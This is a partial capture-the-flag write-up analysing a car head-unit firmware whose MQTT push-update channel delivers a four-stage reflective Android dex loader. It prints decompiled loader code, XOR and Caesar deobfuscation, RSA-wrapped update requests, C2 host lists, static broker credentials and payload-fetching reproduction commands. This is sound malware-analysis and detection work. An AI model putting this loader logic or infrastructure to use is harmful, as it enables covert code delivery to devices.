---
type: writeup
title: "HTB Holmes 2026 — Silent Passenger: MQTT Push-Update Channel and a Four-Stage Reflective Dex Loader"
platform: Hack The Box
event: "Holmes CTF 2026: The Reichenbach Directive"
challenge: Silent Passenger
category: forensics
subcategory: sherlock-dfir
difficulty: hard
points: 1000
status: draft
app: "firmware.zip — TOPWAY/Allwinner T3 p1 Android 8.1 car head-unit firmware: 900 MiB ext4 `system` in three chunks, two opaque high-entropy partition images, vendor `History.txt` changelog"
instance: "154.57.164.82 — five ports, ~4 h at spawn — flags 3–20 gated; 31898 MQTT, 32331 HTTP (vhost-routed), 30894 HTTPS, 30469 + 30519 unidentified binary"
mitre:
  - T1474
  - T1407
  - T1406
  - T1406.002
  - T1437.001
  - T1426
  - T1430
  - T1521.002
  - T1646
tags:
  - writeup
  - HTB
  - Security
  - DFIR
  - Incident_Response
  - forensics
  - Malware_Analysis
  - Mobile_Forensics
related:
  - "[[HTB]]"
  - "[[00_MOC-HTB-Holmes2026-Reichenbach-Directive-Event]]"
  - "[[HTB-Holmes2026-Iron-Feather-PX4-Encrypted-Dataman-ULog-Custom-KDF]]"
  - "[[HTB-Holmes2026-Silent-Dividend-Electron-Preload-Dropper-Onchain-Key-Oracle]]"
  - "[[HTB-Holmes2026-Poisoned-Branch-Backdoored-Git-Repo-XOR-Mettle-ZipCrypto]]"
  - "[[HTB-Holmes2026-Whisper-Chain-Live-XMPP-PubSub-Dispatcher-PerNode-AES]]"
  - "[[HTB-Holmes2026-Last-Light-Golden-Tickets-RBCD-Unflushed-EVTX-Carve]]"
aliases:
  - Silent Passenger
  - Holmes 2026 Silent Passenger
  - Sherlock 06
created: 2026-09-21T13:06:12.127Z
---

# Silent Passenger — MQTT Push-Update Channel and a Four-Stage Reflective Dex Loader

> [!warning] Partial — 2026-09-21 · 10 of 20 flags · 500 / 1000 points
> **No `HTB{}` string exists for this room** — it is question-graded. Sherlock 06 of the event · hard · 1000 points.
> Flags 1–5 and 7–11 solved. **Flag 6 and flags 12–20 open.** Four wrong submissions (§13).
> **Single resume step:** implement the length-prefixed binary protocol from `com.a.b.a.an.a()` — magic `25746`, opcode `101` — against ports **30469 / 30519**. Flags 13–20 are all downstream of the UID that handshake returns. The instance has since expired, so this is resumable only against a fresh spawn.
> **Live-instance record:** `154.57.164.82`, five ports, approximately four hours remaining at spawn. Everything from flag 3 onward existed only on that infrastructure; the 563 MB download answers flags 1 and 2 and nothing else.

> [!info] Scenario, verbatim
> SCENARIO NAME
> 6 - Silent Passenger
> The story will unfold through the PDFs provided with each challenge's downloadable ZIP.
>
> All characters, locations, and events are fictional. Any resemblance to real people, places, or events is purely coincidental.
>
> **Supplied artifact:** `SilentPassenger.zip` → `Holmes CTF 2026 Sherlock 06.pdf` + `firmware.zip` → `History.txt`, `597b623a-bf39-11e9-817d-dbcd8bba2407`, `5d1809fc-bf39-11e9-bfdf-cf15c72d75d6`, `5a2f8d64-bf39-11e9-abb7-3733648aa093.{0,1,2}`.
> **Docker instance:** five ports, no stated service map.

> [!note] Story PDF — chapters 07–09
> The Sherlock 06 PDF carries **Chapters 07, 08 and 09**; Chapter 09 is titled *Silent Passenger*. **PDF chapter numbers do not map to Sherlock numbers** — the vault records Sherlock 09 as *Last Light*. Chapter 09 places the car in the **Pavilion Road car park**, plates false, key gone, dashboard still glowing: *"The useful evidence lay inside the head unit."*

---

## 0. How the answers were obtained

1. **Reassemble the split `system` partition.** Three chunks concatenate to 943,718,404 bytes; the ext4 superblock declares 230,400 × 4096 = 943,718,400. Truncate the 4-byte trailer and the filesystem mounts.
2. **Read `build.prop`.** `ro.fota.oem=TOPWAY` resolves the `TW` prefix in the flag text before any decompilation. Android 8.1, `eng` build, `test-keys`, security patch **2018-09-05** on a 2024 firmware.
3. **Locate the updater.** `/system/priv-app/TWCore/TWCore.apk` bundles the Eclipse Paho MQTT client and ships `ic_upgrade.png`. → **flag 1**.
4. **Decompile TWCore.** `com.tw.core.e.e.lB()` selects region from the device locale plus `ro.com.google.gmsversion`; `com.tw.core.a.a` holds the per-region broker; `com.tw.core.app.a` builds the topic tree. → **flags 2, 3, 4**.
5. **Subscribe to the live broker.** Port 31898, `dofun` / `dofun666666`, topic `dofun/car/config/#`. One retained message on `dofun/car/config/upgrade` carries a base64 upgrade instruction. → **flag 5**.
6. **Fetch the delivered APK.** The instruction's path is `http://127.0.0.1/payloads/jarservice-v1.12.apk`; the HTTP service on 32331 is **virtual-host routed** and serves it only under `Host: 127.0.0.1`. MD5 matches the instruction's `key` field.
7. **Reconstruct the embedded stage.** `com.x.zg.n.a()` concatenates thirty byte arrays (`c.b` … `l.d`), XORs each with `30 − index`, then reads float / int / UTF / UTF; the remainder is a ZIP. → **flag 7**.
8. **Decompile stage 2 and deobfuscate.** `a.a(s,i)` is a Caesar shift (subtract `i`); `o.a(s,i)` reverses first. Decoding every literal yields the version string, the API path and the host set. → **flags 8, 9**.
9. **Speak the update protocol.** `com.c.j.n.a()` generates a `/apiv2/<hex>` request-target; `com.c.j.s.a()` RSA-encrypts the JSON body in 117-byte PKCS#1 blocks under a public key embedded in `com.c.j.r`. The reply decrypts with the **private** key sitting beside it. → **flag 10**.
10. **Unwrap the `.png`.** `com.c.j.c.a()` reads one type byte and a float, multiplies the float by 100, and XORs the remainder with the result. `3.68 × 100 = 368`, low byte `0x70`. → **flag 11**.
11. **Stalled at the registration socket.** Stage 3's `com.a.b.a.an.a()` talks a length-prefixed binary protocol to `127.0.0.1:12101`. Ports 30469 and 30519 accept TCP, send nothing, and reset on a malformed frame. Flags 13–20 sit behind it.

---

## 1. Shape of the challenge

An **aftermarket Chinese Android car head unit** whose vendor update channel is the intrusion path. The room is a staged-loader unwrap: each stage is an artifact recovered from the one before it, and every stage after the first exists only on live infrastructure.

**The download is almost entirely a decoy of scope.** 563 MB of firmware answers two flags. Flags 3 through 20 are all on the Docker instance, and the firmware's only remaining job is to tell you the credentials and the protocol to reach it.

**The device.** From `/build.prop`:

| Property | Value |
|---|---|
| `ro.product.brand` / `model` | `Allwinner` / `QUAD-CORE T3 p1` |
| `ro.build.version.release` / `sdk` | `8.1.0` / `27` |
| `ro.build.version.security_patch` | **`2018-09-05`** |
| `ro.build.type` / `tags` | `eng` / `test-keys` |
| `ro.fota.oem` / `platform` / `device` | `TOPWAY` / `T3L` / `THEME1_0000` |
| `ro.tw.version` | `V8.1.1_20240221.173226_THEME1` |
| `ro.product.locale` | `zh-CN` |

A 2024 build shipping a 2018 patch level, engineering-signed with test keys. `TW` = **TOPWAY**.

**Artifact inventory.**

| File | Bytes | What it is |
|---|---|---|
| `5a2f8d64-…093.0/.1/.2` | 419,430,400 ×2 + 104,857,604 | ext4 `system`, volume `system`, UUID `da594c53-9beb-f85c-85c5-cedf76546f7a`, last written 2024-02-21 09:32:27 |
| `5d1809fc-…75d6` | 67,108,896 | opaque — 64 MiB + 32, entropy 7.997 throughout |
| `597b623a-…2407` | 17,166,368 | opaque — 4096×4191 + 32, entropy 7.997 throughout |
| `History.txt` | 7,412 | vendor changelog, 2019-11-12 → 2024-02-20 |

**`History.txt` is evidence, not packaging.** A Chinese-language vendor changelog whose final entry (`Whn`, 2024/2/20 16:22, *"打包最新谷歌商店"* — packaged latest Play Store) sits one day before the filesystem's last write. Three entries describe the vendor deliberately weakening the platform:

- 2022-12-27 — *"更新 system/bin/adb-carnet：解决钛马星不能使用问题"* — updates an `adb-` binary under `system/bin` to fix **钛马星 (Tima Star)**, a Chinese connected-car telematics service.
- 2023-12-26 — *"临时解决 Carplay 权限"* — a **temporary permission workaround** for CarPlay.
- 2021-10-18 — *"增加一种假内存修改方式，仅修改UI显示"* — a way to **falsify reported memory, UI display only**.

---

## 2. TWCore — region selection and the push channel

`/system/priv-app/` holds 54 entries, including `TWCore`, `TDService`, `TWFileExplore` and thirteen `com.tw.*_XXXX` packages. `TWCore.apk` is 280,499 bytes, dated 2023-12-26.

```
/system/priv-app/TWCore/TWCore.apk
  sha256 d7569563cd0491e76d28a1c6a9929234ffffcf035194d2288d888dced7aa11c2
```

It bundles `org.eclipse.paho.client.mqttv3` and ships `res/mipmap-hdpi-v4/ic_upgrade.png`; its dex references `android.content.pm.IPackageInstallObserver` and writes to `/push/apk/` and `/push/.cache_app_upgrade_result.df`. **A privileged app with an MQTT stack and a package-install observer is the delivery mechanism.**

### 2.1 The region test

```java
// com.tw.core.e.e
private static final String gZ = SystemProperties.get("ro.com.google.gmsversion");

public static boolean lB() {
    String jy = H.jy(DoFunApplication.nF());   // device locale
    if (TextUtils.isEmpty(gZ)) return "zh_CN".equals(jy);
    return false;
}
```

**Mainland is the default and the fallback.** The function returns true only when the GMS version property is *empty* and the locale is `zh_CN`; a GMS-bearing build is forced overseas. The broker confirmed mainland — `overseas/car/config/#` was refused by ACL, `dofun/car/config/#` was accepted.

### 2.2 Broker, credentials, topic tree

```java
// com.tw.core.a.a          (D.fj is the debug flag, false in production)
if (e.lB()) { h = D.fj ? "tcp://mqtt.car.test.cardoor.cn:1883" : "tcp://mqtt.car.cardoor.cn:1883"; }
else        { h = D.fj ? "tcp://overseas.dev.cardoor.cn:1883"  : "tcp://mqtt.car.dofuncar.com"; }

// com.tw.core.f.d
hw = D.fj ? "dofuntest" : "dofun";
hx = D.fj ? "dofuntest" : "dofun666666";

// com.tw.core.app.a
jo = e.lB() ? "dofun" : "overseas";
jp = jo + "/car/config/#";
```

**The credentials are region-independent; only the broker host changes.** That is what makes the mainland/overseas decision load-bearing for flags 3 and 4 but invisible in flag 3's credential half.

HTTP base for the same region: `http://core.car.cardoor.cn/core/api/`, with `upgradeauto/upinfo?` and `upgradeauto/upresult`.

### 2.3 The retained upgrade instruction

One retained message on `dofun/car/config/upgrade`, 246 bytes:

```
0500H26STAGE0100000000eyJwYWNrYWdlIjoiY29tLnR3LmphcjEi...
```

A 22-byte header (`0500H26STAGE0100000000`) followed by base64:

```json
{"package":"com.tw.jar1","flag":12,
 "path":"http://127.0.0.1/payloads/jarservice-v1.12.apk",
 "key":"6c2e34b30da42085240ede53ab6107d4",
 "not_exist_install":true,"type":0}
```

`not_exist_install: true` is the question's *"previously absent"* stated in the operator's own schema — install only if the package is not already present. `key` is the MD5 the updater verifies.

---

## 3. Stage 1 — `jarservice-v1.12.apk`

38,095 bytes · md5 `6c2e34b30da42085240ede53ab6107d4` · sha256 `8e48cca62de5d69f29da5326827e2b0635630c99536e42399b62ff69755a1c4c`

Contents: `AndroidManifest.xml`, `classes.dex` (26,572 B), `resources.arsc`, ten obfuscated `res/` files. **No assets** — the next stage is carried inside the dex as class constants.

Two packages: `com.tw.jar` (four near-empty classes, an `Application`, a `Service` that sleeps forever, an empty `BroadcastReceiver`) and `com.x.zg` (fifteen classes, the actual loader).

```java
// com.tw.jar.App
Log.i("App", "load 2039");
ifz.t(this);

// com.x.zg.ifz
public static synchronized void t(Context context) {
    byte[] b = {80, 85, 86, 93};
    for (int i = 0; i < 4; i++) b[i] = (byte)(b[i] ^ "beed72".charAt(i % 6));
    k(context, new String(b));          // "2039"
}
```

`[80,85,86,93] XOR "beed"` = `0x32 0x30 0x33 0x39` = **`2039`**, corroborated by the adjacent log line.

### 3.1 The reconstruction

```java
// com.x.zg.n.a(String path)
byte[][] arr = {c.b, c.c, c.d, d.b, … , l.b, l.c, l.d};   // 30 arrays
for (int i = 0; i < 30; i++)
    for (int j = 0; j < arr[i].length; j++)
        out.write(arr[i][j] ^ (30 - i));

DataInputStream in = new DataInputStream(out.toByteArray());
m.b = in.readFloat();      // 1.2
m.c = in.readInt();        // 1
m.d = in.readUTF();        // "com.c.j.qbh"
m.e = in.readUTF();        // "wa"
/* remainder → file */
```

Then in `b.run()`:

```java
Class<?> clsA = new o(m.a.getAbsolutePath(), dir.getAbsolutePath(), i).a(m.d);
clsA.getMethod(m.e, Context.class, String.class).invoke(clsA, context, "2039");
```

`o`'s constructor resolves `dalvik.system.DexClassLoader`, `java.lang.ClassLoader` and `java.lang.String` through a **reverse-then-Caesar** obfuscation (`o.a(s,i)` = reverse, then subtract `i`), instantiates the loader by reflection, and `o.a(String)` calls `loadClass`.

**This is the reflective entry point flag 6 asks for** — and the one I got wrong (§13).

Output: 14,626 bytes, `PK\x03\x04`.

```
stage2  sha256 cf5c8c624967775230573a5a552e2e4e2b3653f2362e8c9b66a801e3b251f37c
```

---

## 4. Stage 2 — `com.c.j`, the update client

`stage2.bin` is a JAR holding `META-INF/MANIFEST.MF` and a 28,112-byte `classes.dex`. Twenty-four classes, all single-letter but `qbh` and `hgm`.

**String obfuscation, both variants:**

```python
a.a(s, i) = ''.join(chr(ord(c) - i) for c in s)          # Caesar
o.a(s, i) = ''.join(chr(ord(c) - i) for c in s[::-1])    # reverse, then Caesar
```

Eighty-six literals decode. The load-bearing ones:

| Class:line | Decoded |
|---|---|
| `m:17` | `1.7` — the version the stage reports |
| `m:18` | `/api/rsaUpdate` |
| `m:23` | `http://a1.xshaon123.sbs` · `http://a1.xmsae.sbs` · `http://a1.ishano456.sbs` · `https://a1.ishano456.sbs` |
| `n:7` | `Mu^38Ydeo233Uowd` — the target-signing key |
| `n:10` | `/apiv2/` |
| `g:36` | `http://t1.vrr8345.site/cpc/api/client/active?channelId=` + `&uid=` |
| `c:97` | `com/ast/sdk/BillingMain` (after reverse + shift 1) |
| `c:17` | `sdk.jar` |
| `m:20–22` | `.mm/.d` (host dir) · `.px` (payload) · `.ver` (version file) |
| `s:16` | `RSA/ECB/PKCS1Padding` |

### 4.1 The generated request-target

```
target = "/apiv2/" + hex( XOR( hex(XOR(path, str(rnd))) + "|" + ts + "|" + rnd,
                               "Mu^38Ydeo233Uowd" ) )
```

`rnd` is a fresh `10000–99999`, `ts` unix seconds. The target is per-request and decodes back to `/api/rsaUpdate` — **the endpoint is concealed inside the path, not carried by it**, which is what flag 9 means by "concealed".

### 4.2 RSA both ways

`com.c.j.r` carries **both** keys as `byte[]` literals: `r.a` is a 1024-bit X.509 `SubjectPublicKeyInfo`, `r.b` the matching PKCS#8 private key. `s.a()` encrypts the request JSON in 117-byte PKCS#1 v1.5 blocks; the response is decrypted in 128-byte blocks with `r.b`.

**Shipping the private key beside the public one is the §3.3 pattern again** — the protection is not load-bearing because everything needed to defeat it travels with the artifact.

Request body: `userId`, `dexVersion`, `dexType`, `channelId`, `packageName`, `appVersion`, `appName`.

Response, decrypted:

```json
{"code":200,"data":{"dexUrl":"http://127.0.0.1/vr34der34/dex3.68.png",
                    "dexVersion":3.68,"status":0}}
```

All three `a1.*` vhosts returned the identical object.

---

## 5. Stage 3 — the `.png` that is not a PNG

`dex3.68.png`, 59,379 bytes, `file` says `data`. Header:

```
00000000: 0140 6b85 1f20 3b73 7464 7078 7878 7008  .@k.. ;stdpxxxp.
00000010: 210e 2c70 7070 7070 7070 7070 7070 7064  !.,ppppppppppppd
```

```java
// com.c.j.c.a(Context, InputStream)
byte b2 = in.readByte();                  // 0x01 — type
int  i  = (int)(in.readFloat() * 100.0f); // 3.68 → 368
… bArr[i3] = (byte)(bArr[i3] ^ i);        // low byte 0x70
```

The long `0x70` runs are encoded zero bytes. Bytes 5 onward, `20 3b 73 74` XOR `0x70` = `50 4b 03 04` = `PK\x03\x04`.

```
stage3  sha256 79e01a591c81554b57e0baaf877ca0a1a1f86f39d38973faa1580089b675838d
```

An APK holding a 132,128-byte `classes.dex` dated **2026-03-30**, two years newer than the firmware around it.

Package `com.a.b.a`, same Caesar obfuscation under `aq.a()`. Endpoint map from `com.a.b.a.am`:

```
/cpc/api/task              /cpc/api/proxy/origin      /cpc/api/device
/cpc/api/xml               /task/detailClick          /task/traceroute
/task/reportTaskLocationPhone                          /api/init?configVersion=
```

with host pools `t1.{xshaon123,xmsae,ishano456}.sbs` and `a1.{…}.sbs`, and `ap.a = 3.68` (dex version), `ap.b = 3.8` (config version).

### 5.1 The registration socket — where the room stopped

```java
// com.a.b.a.an.a()
Socket socket = new Socket("127.0.0.1", 12101);
out.writeInt(25746);
out.writeByte(101);
byte[] bytes = "suid,uid".getBytes();
out.writeInt(bytes.length);
out.write(bytes);
if (in.readInt() != 25746) { … return null; }
byte[] b = new byte[in.readInt()];
inputStream.read(b);
return new String(b);                     // the UID
```

Ports **30469** and **30519** accept TCP, emit nothing on connect, and `RST` on this frame. 30894 answers TLS with an HTTP 400 (so it is HTTPS, not this protocol). **Flag 13 is the string this call returns, and flags 14–20 are all downstream of it.**

---

## 6. Final payload — reproduction

Scripts are in the session working directory; each is a direct port of the Java it replaces.

```bash
# 0. reassemble and mount the system image
cat 5a2f8d64-*.0 5a2f8d64-*.1 5a2f8d64-*.2 > system_full.bin
head -c 943718400 system_full.bin > system.img
debugfs -R "dump /priv-app/TWCore/TWCore.apk ex/TWCore.apk" system.img

# 1. flags 3–5: the broker
mosquitto_sub -h 154.57.164.82 -p 31898 -u dofun -P dofun666666 \
  -i "TWCORE-$RANDOM" -t 'dofun/car/config/#' -v -W 15 -d

# 2. the delivered APK — Host header is mandatory
curl -s -H 'Host: 127.0.0.1' -o jarservice-v1.12.apk \
  "http://154.57.164.82:32331/payloads/jarservice-v1.12.apk"

# 3. flag 7: reconstruct the embedded stage
jadx -d "$PWD/jar1_src" --no-res "$PWD/jarservice-v1.12.apk"
python3 recon.py jar1_src/sources/com/x/zg stage2.bin

# 4. flags 8–9: decode every obfuscated literal
jadx -d "$PWD/stage2_src" --no-res "$PWD/stage2.bin"
python3 deob.py stage2_src/sources > stage2_strings.txt

# 5. flag 10: signed target + RSA request
python3 rsaclient.py

# 6. flag 11: unwrap the .png
curl -s -H 'Host: 127.0.0.1' -o dex3.68.png \
  "http://154.57.164.82:32331/vr34der34/dex3.68.png"
python3 -c "
import hashlib
d=open('dex3.68.png','rb').read(); o=bytes(b^0x70 for b in d[5:])
open('stage3.zip','wb').write(o); print(hashlib.sha256(o).hexdigest())"
```

**`recon.py`** — parses the thirty `byte[]` literals out of the decompiled `.java` rather than retyping them, XORs each with `30 − index`, then reads `float / int / UTF / UTF` and writes the remainder.
**`deob.py`** — regex-matches `<cls>.a("lit", N)`, unescapes Java string escapes including `\uXXXX`, and prints both the Caesar and the reverse-then-Caesar readings.
**`target.py`** — the `/apiv2/<hex>` generator, verified by round-tripping a target back to `/api/rsaUpdate`.
**`rsaclient.py`** — reads both keys out of `r.java`, encrypts in 117-byte blocks, POSTs to a fresh target, decrypts the reply in 128-byte blocks.
**`regsock.py`** — the (unsuccessful) `an.a()` handshake client.

### 6.1 Answers submitted and accepted

| # | Answer |
|---|---|
| 1 | `/system/priv-app/TWCore/TWCore.apk:d7569563cd0491e76d28a1c6a9929234ffffcf035194d2288d888dced7aa11c2` |
| 2 | `ro.com.google.gmsversion` |
| 3 | `tcp://mqtt.car.cardoor.cn:1883\|dofun:dofun666666` |
| 4 | `dofun/car/config/#` |
| 5 | `com.tw.jar1:12:6c2e34b30da42085240ede53ab6107d4` |
| 7 | `cf5c8c624967775230573a5a552e2e4e2b3653f2362e8c9b66a801e3b251f37c` |
| 8 | `1.7` |
| 9 | `/api/rsaUpdate` |
| 10 | `/vr34der34/dex3.68.png` |
| 11 | `79e01a591c81554b57e0baaf877ca0a1a1f86f39d38973faa1580089b675838d` |

---

## 7. Tools & techniques

`debugfs` / `dumpe2fs` (e2fsprogs 1.47.0) · `jadx` 1.5.6 · `mosquitto_sub` 2.1.2 · `curl` · `python3` (`cryptography`, `hashlib`, `http.client`) · `unzip` · `od`

**Concepts:** split-image reassembly from a declared superblock size · Android `priv-app` privilege surface · MQTT ACL probing by SUBACK return code · virtual-host-routed HTTP on a CTF instance · multi-array XOR reconstruction with a positional key · Caesar and reverse-Caesar string obfuscation in dex · `DexClassLoader` instantiated by reflection · generated request-targets as endpoint concealment · asymmetric crypto defeated by a co-located private key · float-derived XOR key from a file header.

---

## 8. MITRE ATT&CK

> [!warning] Honest scope
> **These are Mobile ATT&CK IDs assigned without access to the live matrix.** Several Mobile technique IDs have been revoked or renumbered across versions — **`T1407` in particular is believed deprecated** in current Mobile ATT&CK and is retained here only as the closest named behaviour. Treat the whole list as unverified pending a matrix read.
> The weakest entry is **`T1474`**: the vendor firmware is not demonstrably *compromised* in this evidence. What the artifacts show is a vendor update channel being *used as designed* by an operator holding valid broker credentials. That is closer to valid-account abuse of a supply channel than to supply-chain compromise, and no artifact in this room establishes which.

| ID | Where |
|---|---|
| T1474 | Vendor MQTT push-update channel used to deliver a non-vendor package |
| T1407 | `DexClassLoader` loading a stage reconstructed at runtime from dex constants |
| T1406 / T1406.002 | Caesar + reverse-Caesar string obfuscation; positional-XOR array packing; float-derived XOR over the `.png` |
| T1437.001 | HTTP update/registration traffic; RSA-wrapped JSON bodies |
| T1426 | `ro.com.google.gmsversion`, locale, `versionCode`, `packageName` read for region and build targeting |
| T1430 | `overseas/cloud/collect/gps`, `/task/reportTaskLocationPhone`, `/data/tw/location.wl` in the recovered topic and endpoint maps |
| T1521.002 | RSA/ECB/PKCS1 request and response bodies |
| T1646 | `/cpc/api/proxy/origin` and the collect topics as the exfil path |

**Enterprise analogues** where a reader wants them: `T1620` (reflective code loading) for §3.1, `T1027.009` (embedded payloads) for the thirty-array packing.

---

## 9. Detection / blue-team & fix notes

- **The class, not the instance.** A `priv-app` package that holds both an MQTT client and a package-install observer is an unauthenticated remote-install primitive. On a fleet, the control is to deny `INSTALL_PACKAGES` to anything whose install source is a broker topic.
- **Broker ACLs are the whole perimeter here.** The credentials `dofun` / `dofun666666` are static, region-independent, and compiled into every unit in the fleet. **One extracted head unit yields the fleet's subscribe rights.** Per-device credentials and a subscribe-only ACL scoped to the device's own topic would reduce the retained-message read to a single vehicle.
- **The retained message is the detection opportunity.** It persists on the broker and is served to every subscriber on connect, so a passive subscriber sees the tasking without touching a device.
- **Stage-count is a signal.** Four stages, each decoded by a different primitive, with the final loader dated two years after the firmware. A fleet integrity check that hashes `/data/data/*/files/.mm/.d/*` against a vendor manifest catches the payload without needing to understand any of the encodings.
- **Fix the patch level.** A 2024 build on a 2018-09-05 security patch with `test-keys` and `ro.build.type=eng` fails before any of the above matters.

---

## 10. Method notes

- **Live-infra-first was not followed, and this time it cost the room.** §3.12 of the event MOC already says perishable evidence is worked first. Here the ordering was: reassemble a 900 MB image, decompile, *then* discover that eighteen of twenty flags live on a Docker instance with hours left. The static chain is restartable; the instance was not.
- **A four-hour timer changes what "thorough" means.** Roughly forty minutes of the session went into the two opaque firmware blobs (§11). They were never identified and were never needed.
- **Port-mapping should have been step one.** Five ports, no service map. Five `curl` calls and one `nc` would have shown one HTTP, one HTTPS, one MQTT and two unknown binary services inside a minute, and would have reframed the whole room before any decompilation.
- **`mosquitto_sub` without `-i` sends a null client ID and the broker silently drops the connection** — visible only as repeating `Client null sending CONNECT` with no CONNACK. Two rounds were lost to this before the working invocation (which had `-i "TWCORE-$RANDOM"`) was compared against the failing one.
- **SUBACK return code is an oracle.** `128` is ACL denial, `0` is granted. That distinction settled the mainland-vs-overseas question from the server rather than from a reading of `lB()`, and it is free — no submission spent.
- **Decompile before grepping strings.** `strings classes.dex` on stage 1 returned obfuscated noise and three useful tokens. `jadx` plus an 80-line deobfuscator returned all eighty-six literals with call sites.
- **Parse the decompiler output, don't retype it.** `recon.py` reads the thirty `byte[]` arrays out of the `.java` files. Hand-transcribing ~10 kB of signed decimal bytes would have been the single most likely place for a silent error.

---

## 11. Blind alleys

- **The two opaque firmware images.** `597b623a-…` (17,166,368 B) and `5d1809fc-…` (67,108,896 B). Both are exactly `N × 4096 + 32` bytes with entropy 7.997 uniform from byte 0 to EOF. Tested and eliminated: not a SHA-256 digest trailer (head and tail both fail against the body); **zero** repeated 16-byte blocks across a 32 MiB sample of each, which rules out ECB, repeating-key XOR and any static keystream. No cleartext header, so no format identification. **Never identified, and never needed** — the entire flag chain runs through `system` and the live instance.
- **`/core/api/*` on port 32331.** TWCore's own API base is `http://core.car.cardoor.cn/core/api/`, and every endpoint under it 404s on the instance. That host is the *payload and update* host, not TWCore's backend; the room only ever serves `/payloads/…`, `/vr34der34/…`, `/apiv2/…` and `/cpc/api/client/active`.
- **The two-image-set hypothesis.** Reasoned from `firmware.zip` being dated 2026-08-31 — before the event opened — that it was separately-sourced stock firmware and that a device acquisition existed elsewhere. `unzip -l` disproved it: `SilentPassenger.zip` contains only the PDF and `firmware.zip`. **Cost: one round trip.** The lesson is that an archive's mtime describes when it was packed, not where it came from.

---

## 12. Open items

1. **Flag 6 — the reflective entry point.** Submitted `com.x.zg.ifz.t:2039`, not accepted (§13). **[Inference]** the correct answer is `com.c.j.qbh.wa:2039` — `ifz.t` is a direct call, whereas `b.run()` performs `clsA.getMethod(m.e, …).invoke(…)` with `m.d = "com.c.j.qbh"` and `m.e = "wa"` from the reconstructed header. Untested.
2. **Flags 13–20 — the registration protocol.** `an.a()` is fully decompiled and the frame shape is known; ports 30469/30519 reset on it. Unknown whether the reset is a framing difference, a required TLS wrapper, or a preceding message. **This is the single resume step.**
3. **Flag 12 — the configuration request-target.** `am.j` (`/api/init?configVersion=`) has **zero call-site references** in stage 3. **[Inference]** the live target is generated, as in stage 2, by a `n.a()`-equivalent in `com.a.b.a`; `ab.java` and `n.java` in `stage3_src` were never read.
4. **`com/ast/sdk/BillingMain`** — recovered from `c.java:97` by reverse-then-Caesar. **[Unverified]** whether this class exists in stage 3's dex; only `com/a/b/a/*.java` was enumerated. It is the class `c.a()` loads from `sdk.jar`, so it is the likely host of flag 17's entry point.
5. **`qbh.pbi()` calls `wa(context, "1001")`** — a second four-digit channel beside `2039`. Uncharacterised.
6. **The 22-byte MQTT header** `0500H26STAGE0100000000` was never parsed. `STAGE01` is legible; the leading `0500H26` and the trailing zero run are not.
7. **`t1.vrr8345.site/cpc/api/client/active?channelId=2039&uid=1`** returned `{"code":200,"data":1}` — activation succeeds with an arbitrary `uid`. Not pursued.
8. **The 4-byte trailer** `e3 e4 96 cb` after the 900 MiB filesystem. **[Guessing]** a CRC32 over the image; never verified.
9. **`solves` and `category` unverified** — not read off the platform page. `difficulty: hard` and `points: 1000` **are** verified from the scenario page.
10. **Flag 20's coordinates.** Chapter 09 puts the car in the **Pavilion Road car park**; Iron Feather's flag 17 resolved to Knightsbridge / Edinburgh Gate, a few hundred metres away. **[Inference]** the relay coordinates are in that same block, and Iron Feather §15.8's point-data-versus-road-geometry caveat likely applies.

---

## 13. Wrong submissions

Four, all on correct-or-nearly-correct analysis.

| # | Submitted | Why it failed |
|---|---|---|
| 10 | `dexUrl` | The **field name** from `b.java`'s response parser, submitted instead of the value the field carries. The question asks for a path; a JSON key is not a path. |
| 13 | `→ int32 25746 \| byte 101 \| int32 len \| "suid,uid" ← …` | A prose description of the protocol, pasted into the answer box. Not an answer at all. |
| 12 | `/api/init?configVersion=` | The bare prefix, with no version value. |
| 12 | `/api/init?configVersion=3.8` | **The real error.** `am.j` is an *unreferenced constant* — it has zero call sites in the decompiled stage. A decoded literal with no call site is not a live request-target, and submitting one is a guess wearing the costume of evidence. |

**Both flag-12 submissions and the flag-10 submission originated from the analysis assistant, not from independent reasoning.** The failure mode is worth naming precisely: *decoded* is not *used*. The deobfuscator prints every literal in the binary; only some of them are reachable.

**Flag 6** is a fifth candidate failure but is not counted here — the answer was derived and stated, and the platform total confirms it was not accepted, but no rejection was observed in-session, so whether it was submitted is unrecorded.

---

## 14. Cross-references

- [[00_MOC-HTB-Holmes2026-Reichenbach-Directive-Event]] — event index; this room supplies the eighth entry in §4's failure taxonomy (**protocol-gated**, §15 below) and a second instance of §3.12's perishable-evidence rule, this time as a cost rather than a near-miss
- [[HTB-Holmes2026-Iron-Feather-PX4-Encrypted-Dataman-ULog-Custom-KDF]] — Sherlock 07; the delivery half of the same operation, and the geographic neighbour of flag 20
- [[HTB-Holmes2026-Silent-Dividend-Electron-Preload-Dropper-Onchain-Key-Oracle]] — Sherlock 01; staged loader with the key outside the protected artifact, same structure as §4.2
- [[HTB-Holmes2026-Poisoned-Branch-Backdoored-Git-Repo-XOR-Mettle-ZipCrypto]] — Sherlock 05; origin of the live-host expiry rule this room re-proves, and the other repeating-XOR reconstruction in the event
- [[HTB-Holmes2026-Whisper-Chain-Live-XMPP-PubSub-Dispatcher-PerNode-AES]] — Sherlock 03; the event's other live pub/sub command channel
- [[HTB-Holmes2026-Last-Light-Golden-Tickets-RBCD-Unflushed-EVTX-Carve]] — Sherlock 09; the event's other partial
- [[00_ctf-writeup-standard]] — structure this note conforms to
- [[HTB]]

---

## 15. Proposed taxonomy addition — protocol-gated

Offered for the MOC's §4, not yet written there.

**Protocol-gated.** *The analysis is complete and the remaining answers require speaking a service's wire format correctly, with a connection reset as the only feedback signal.*

Distinct from the existing seven classes. Classes 1–5 concern **evidence** — wrong source, wrong format, misread container. Classes 6 and 7 concern **reasoning about a correct finding** — an ambiguous referent, and exhaustive enumeration of a wrong hypothesis. This one is neither: every artifact was recovered and every transform correctly ported; flags 13–20 failed on an unimplemented client. No further static analysis would have moved them.

**Corollary:** in a room with live infrastructure, map every port to a protocol before beginning static work. The static chain is restartable; the instance is not.

---

## Change Log

- 2026-09-21 — Note created. Ten of twenty flags recorded; scenario and story-chapter context captured verbatim. All four wrong submissions logged in §13 with the reasoning at the time. §12.1 records the leading candidate for flag 6 and the reasoning that supersedes the submitted answer. §15 proposes a sixth failure class for the event MOC. `status: draft` — the note is a first pass; per `00_ctf-writeup-standard` §1.1 the terminal value once the note is finished and the room will not be resumed is `closed`, and the filename already carries the `-PARTIAL` suffix that accompanies it. `created` stamped from a real fetched UTC clock. `updated` omitted per `02_frontmatter-standard` §1 (plugin-owned, not hand-stamped). `solves` and `category` unverified (§12.9). **Mitre table mixes Mobile IDs of uncertain currency — flagged in §8, not resolved.**
